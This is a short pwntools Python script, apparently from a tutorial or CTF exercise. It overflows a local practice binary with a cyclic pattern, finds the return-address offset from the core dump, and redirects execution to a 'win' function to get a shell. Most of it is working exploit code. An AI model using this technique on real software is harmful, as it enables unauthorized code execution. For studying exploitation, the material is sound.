from pwn import *
context(arch='i386', os='linux')

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(128)

# Run the process once so that it crashes
process(['./demo', payload]).wait()

# Get the core dump
core = Coredump('./core')

# Our cyclic pattern should have been used as the crashing address
print(pack(core.rip))
assert pack(core.rip) in payload

# Cool! Now let's just replace that value with the address of 'win'
crash = ELF('./crash')
payload = fit({
        cyclic_find(core.rip): crash.symbols.bet_you_cant_get_here
})

# Get a shell!
io = process(['./crash', payload])
io.sendline(b'id')
print(io.recvline())
# uid=1000(user) gid=1000(user) groups=1000(user)




#io = process([
